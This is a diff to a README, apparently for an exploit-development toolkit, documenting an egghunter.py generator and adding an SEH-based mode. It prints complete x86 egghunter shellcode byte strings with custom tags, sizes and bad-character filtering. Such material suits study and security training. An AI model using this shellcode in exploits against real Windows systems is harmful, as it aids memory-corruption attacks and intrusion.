@@ -24,28 +24,37 @@ optional arguments:
 generate default egghunter
 ```
 ./egghunter.py 
+[+] egghunter created!
+[=]   len: 35 bytes
+[=]   tag: c0d3c0d3
+[=]   ver: NtAccessCheckAndAuditAlarm
+
 egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
-egghunter created:
-  len: 35 bytes
-  tag: c0d3c0d3
+
 ```
 
 generate egghunter with `w00tw00t` tag
 ```
 ./egghunter.py --tag w00t
+[+] egghunter created!
+[=]   len: 35 bytes
+[=]   tag: w00tw00t
+[=]   ver: NtAccessCheckAndAuditAlarm
+
 egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
-egghunter created:
-  len: 35 bytes
-  tag: w00tw00t
+
 ```
 
-generate egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
+generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
 ```
-./egghunter.py -b 00 0a 25 26 3d
-egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
-egghunter created:
-  len: 35 bytes
-  tag: c0d3c0d3
+./egghunter.py -b 00 0a 25 26 3d --seh
+[+] egghunter created!
+[=]   len: 69 bytes
+[=]   tag: c0d3c0d3
+[=]   ver: SEH
+
+egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"
+
 ```
 
 ## WinDbg Scripts
